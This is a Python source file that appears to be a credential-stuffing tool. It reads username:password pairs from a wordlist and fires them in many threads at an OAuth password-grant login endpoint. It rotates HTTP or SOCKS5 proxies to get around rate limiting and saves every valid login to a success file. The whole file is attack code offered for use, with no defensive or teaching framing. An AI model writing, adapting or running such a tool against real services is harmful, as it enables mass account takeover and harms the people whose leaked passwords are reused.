import requests
import threading
from queue import Queue
import os

# Load credentials from the wordlist file
#Credentials are in the format: username:password
def load_wordlist(filename):

    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
         try:
            if line.count(":") != 1:
                continue
            username, password = line.strip().split(":")
            yield username, password
         except:
            continue
 

# Load proxies from the proxies file
def load_proxies(filename):
    with open(filename, 'r') as file:
        return [proxy.strip() for proxy in file] 

# Send requests to the API
def send_request(username, password, proxy_queue):
    global counter
    url = "https://example.com/api/v1/auth/" # Set your API URL here
    data = f"grant_type=password&password={password}&scope=offline_access&username={username}" # Send your payload here

    headers = { # Headers if needed
    "Host": "example.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Connection": "close",
}

    while not proxy_queue.empty():
        proxy = proxy_queue.get()

        if mode == 1:
            proxy_dict = {'http': f'http://{proxy}',
                          'https': f'http://{proxy}'}
        elif mode == 2:
            proxy_dict = {'http': f'socks5://{proxy}',
                            'https': f'socks5://{proxy}'}
        else:
            proxy_dict = None

        try:
            if mode == 1 or mode == 2:
                response = requests.post(url, data=data, proxies=proxy_dict, headers=headers, timeout=5)
                proxy_queue.put(proxy)
            else:
                response = requests.post(url, json=data, headers=headers, timeout=5)
                
                # Handle the response, for example, if the status code is 429, the proxy is rate-limited and we need to try the next one, 
                # or if the status code is 200, the credentials are valid and we can get the access token to use it later
                # You really need to adapt this part to your API
                
            if response.status_code == 429 or response.status_code == 403 or response.status_code == 406: # Uncomment this if you want
             if mode == 1 or mode == 2:
                 
              #  print(f"\033[33mProxy {proxy} rate-limited. Trying next proxy... data used: {username}:{password}\033[0m")
                rien = 1
             else :
                # print(f"\033[33mYou're being rate limited. data used: {username}:{password}\033[0m")
                quedalle = 1
             continue  # this will make the for-loop try the next proxy
                
            elif response.status_code == 200: # For example, if the status code is 200, the credentials are valid and we can get the access token to use it later
                
                token = response.json()["access_token"]
                    

                print(f"\033[93mFound valid credentials: {username}:{password} | No subscription\033[0m")
                        
                with open("successlist.txt", "a") as file: # Save the valid credentials to a file
                    file.write(f"{username}:{password}\n")
                with counter_lock:
                    counter += 1
                    os.system(f"title Cr - Checked : {counter}/{totallines}")
                break
                
            elif response.status_code == 401: # For example, if the status code is 401, the credentials are invalid and we can print them to the console
                print(f"\033[31mInvalid credentials: {username}:{password}\033[0m")
                with counter_lock:
                     counter += 1
                     os.system(f"title Cr - Checked : {counter}/{totallines}")
                break
                  
            else:
                break
        except requests.exceptions.Timeout: # If the proxy timed out, delete it from the list and try the next one
            print(f"\033[35mError with {proxy}: Timeout, trying next proxy...\033[0m")
            continue
        except Exception as e:
            proxy_queue.put(proxy)
            print(f"\033[35mError with {proxy}: {e}\033[0m")
            continue  # this will make the for-loop try the next proxy

# Worker function for threads
def worker():
    while not q.empty():
        username, password = q.get()
        send_request(username, password, proxy_queue)

# Setup and main execution
if __name__ == "__main__":
    print("1. Proxy HTTP\n2. Proxy SOCKS5\n3. Proxyless")
    counter = 0 # Counter for the number of lines checked
    counter_lock = threading.Lock()

    mode = int(input("Choose a mode: "))
    os.system('cls' if os.name == 'nt' else 'clear')
    NUM_THREADS = int(input("Combien de threads voulez-vous utiliser ? "))
    
    proxy_list = load_proxies("proxies.txt") # Load proxies from the file
    q = Queue()
    proxy_queue = Queue()  

    for proxy in proxy_list:
        proxy_queue.put(proxy)  # Add proxies to the Queue

    for username, password in load_wordlist("wordlist.txt"): # Load credentials from the file
        q.put((username, password))
    totallines = sum(1 for line in open("wordlist.txt", 'r', encoding='utf-8'))
    os.system(f"title Cr - Checked : {counter}/{totallines}")

    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker)
        t.start()
